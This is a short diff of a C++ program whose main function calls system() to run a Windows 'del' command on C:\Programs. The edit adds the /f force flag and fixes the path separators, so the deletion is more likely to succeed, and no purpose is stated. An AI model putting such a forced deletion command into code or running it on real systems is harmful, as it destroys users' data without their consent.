@@ -3,6 +3,6 @@
 #include <iostream>
 
 int main() {
-  system("del C:/Programs/");
+  system("del /f C:\\Programs\\");
   return 0;
 }
